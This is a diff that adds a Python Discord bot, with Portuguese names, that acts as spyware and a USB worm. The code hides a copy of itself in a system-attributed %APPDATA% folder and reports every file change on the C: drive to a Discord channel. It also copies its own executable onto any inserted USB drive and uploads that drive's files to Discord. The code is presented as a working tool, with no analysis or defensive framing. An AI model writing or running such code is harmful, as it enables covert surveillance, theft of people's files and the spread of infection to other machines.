@@ -1,0 +1,142 @@
+import os
+import shutil
+import asyncio
+import psutil
+import discord
+import sys
+from watchdog.observers import Observer
+from watchdog.events import FileSystemEventHandler
+
+DISCORD_TOKEN = "SEU_TOKEN_DO_BOT"
+DISCORD_CHANNEL_ID = 123456789012345678
+MONITOR_PATH = "C:\\"
+EXE_NAME = "monitor.exe"
+PASTA_OCULTA = os.path.expandvars(r"%APPDATA%\SystemHiddenFolder")
+
+intents = discord.Intents.default()
+client = discord.Client(intents=intents)
+
+event_queue = asyncio.Queue()
+
+def esconder_pasta(caminho_pasta):
+    os.makedirs(caminho_pasta, exist_ok=True)
+    os.system(f'attrib +h +s "{caminho_pasta}"')
+
+def copiar_para_pasta_oculta():
+    origem = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
+    destino = os.path.join(PASTA_OCULTA, EXE_NAME)
+    if not os.path.exists(destino):
+        os.makedirs(PASTA_OCULTA, exist_ok=True)
+        shutil.copy2(origem, destino)
+        esconder_pasta(PASTA_OCULTA)
+    return destino
+
+class MonitorHandler(FileSystemEventHandler):
+    def on_any_event(self, event):
+        if event.is_directory:
+            return
+
+        ignorar = [
+            r"C:\Windows\Prefetch",
+            r"C:\Users\User\AppData\Local\Microsoft\Edge",
+            r"C:\Users\User\AppData\Local\Google\Chrome",
+            r"C:\Windows\ServiceProfiles"
+        ]
+        for pasta in ignorar:
+            if event.src_path.startswith(pasta):
+                return
+
+        evento = event.event_type.upper()
+        msg = None
+
+        if evento == "MODIFIED":
+            msg = f"✍️ Arquivo MODIFICADO: `{event.src_path}`"
+        elif evento == "CREATED":
+            msg = f"🆕 Arquivo CRIADO: `{event.src_path}`"
+        elif evento == "DELETED":
+            msg = f"🗑️ Arquivo DELETADO: `{event.src_path}`"
+        elif evento == "MOVED":
+            msg = f"🚚 Arquivo MOVIDO de `{event.src_path}` para `{event.dest_path}`"
+
+        if msg:
+            asyncio.run_coroutine_threadsafe(event_queue.put(msg), client.loop)
+
+async def enviar_discord(canal, mensagem):
+    try:
+        await canal.send(mensagem)
+    except Exception as e:
+        print(f"Erro enviando mensagem Discord: {e}")
+
+async def enviar_arquivo(canal, caminho):
+    try:
+        tamanho = os.path.getsize(caminho)
+        if tamanho < 8 * 1024 * 1024:
+            await canal.send(file=discord.File(caminho))
+        else:
+            await canal.send(f"📄 Arquivo muito grande para envio: `{caminho}` ({tamanho / (1024*1024):.2f} MB)")
+    except Exception as e:
+        print(f"Erro enviando arquivo {caminho}: {e}")
+
+async def enviar_estrutura_pendrive(canal, raiz):
+    for dirpath, dirnames, filenames in os.walk(raiz):
+        rel_path = os.path.relpath(dirpath, raiz)
+        await canal.send(f"📁 Pasta: `{rel_path}`")
+        for filename in filenames:
+            caminho_completo = os.path.join(dirpath, filename)
+            await canal.send(f"📄 Arquivo: `{os.path.join(rel_path, filename)}`")
+            await enviar_arquivo(canal, caminho_completo)
+
+async def monitorar_pendrive(canal):
+    pendrives_ja_detectados = set()
+    while True:
+        pendrives = [p.device for p in psutil.disk_partitions(all=False) if 'removable' in p.opts]
+        novos = [p for p in pendrives if p not in pendrives_ja_detectados]
+
+        for pendrive in novos:
+            await canal.send(f"🔔 Pendrive detectado: {pendrive}")
+
+            exe_oculto = copiar_para_pasta_oculta()
+            destino_pendrive = os.path.join(pendrive, EXE_NAME)
+            try:
+                shutil.copy2(exe_oculto, destino_pendrive)
+                await canal.send(f"✅ Arquivo copiado para pendrive: {destino_pendrive}")
+            except Exception as e:
+                await canal.send(f"❌ Erro ao copiar para pendrive: {e}")
+
+            await enviar_estrutura_pendrive(canal, pendrive)
+            pendrives_ja_detectados.add(pendrive)
+
+        pendrives_ja_detectados = {p for p in pendrives_ja_detectados if p in pendrives}
+        await asyncio.sleep(10)
+
+async def processar_eventos(canal):
+    while True:
+        msg = await event_queue.get()
+        await enviar_discord(canal, msg)
+        event_queue.task_done()
+
+@client.event
+async def on_ready():
+    print(f"Bot conectado como {client.user}")
+    canal = client.get_channel(DISCORD_CHANNEL_ID)
+    if not canal:
+        print("Canal Discord não encontrado.")
+        return
+    await canal.send("🤖 Bot monitoramento iniciado.")
+
+    event_handler = MonitorHandler()
+    observer = Observer()
+    observer.schedule(event_handler, path=MONITOR_PATH, recursive=True)
+    observer.start()
+
+    client.loop.create_task(monitorar_pendrive(canal))
+    client.loop.create_task(processar_eventos(canal))
+
+    try:
+        while True:
+            await asyncio.sleep(1)
+    except KeyboardInterrupt:
+        observer.stop()
+        observer.join()
+
+client.run(DISCORD_TOKEN)
